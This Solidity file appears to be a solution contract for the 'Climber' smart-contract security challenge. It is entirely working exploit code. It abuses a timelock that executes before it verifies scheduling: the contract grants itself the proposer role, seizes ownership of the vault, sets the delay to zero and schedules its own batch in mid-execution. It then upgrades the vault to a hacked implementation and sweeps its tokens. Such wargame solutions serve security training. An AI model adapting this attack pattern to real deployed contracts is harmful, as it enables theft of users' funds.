// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberTimelockBase.sol";
import "./ClimberVault.sol";
import "./ClimberVaultHacked.sol";
import "./ClimberConstants.sol";

contract ClimberTheAttacker {
    uint256 N = 4;

    address[] targets;
    uint256[] values;
    bytes[] data;

    ClimberVault vault;
    ClimberTimelock timelock;
    address token;

    constructor(
        ClimberVault _vault,
        ClimberTimelock _timelock,
        address _token
    ) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        targets = new address[](N);
        values = new uint256[](N);
        data = new bytes[](N);
    }

    function attack() external {
        uint256 i = 0;
        targets[i] = address(timelock);
        values[i] = 0;
        data[i] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );
        i = 1;
        targets[i] = address(vault);
        values[i] = 0;
        data[i] = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(this)
        );
        i = 2;
        targets[i] = address(timelock);
        values[i] = 0;
        data[i] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        i = 3;
        targets[i] = address(this);
        values[i] = 0;
        data[i] = abi.encodeWithSignature("proposeSchedule()");
        timelock.execute(targets, values, data, keccak256("1"));
    }

    function proposeSchedule() external {
        timelock.schedule(targets, values, data, keccak256("1"));
    }

    function upgradeVault(address newVault) external {
        vault.upgradeTo(newVault);
        ClimberVaultHacked(address(vault)).setSweeper(msg.sender);
        ClimberVaultHacked(address(vault)).sweepFunds(token);
    }
}
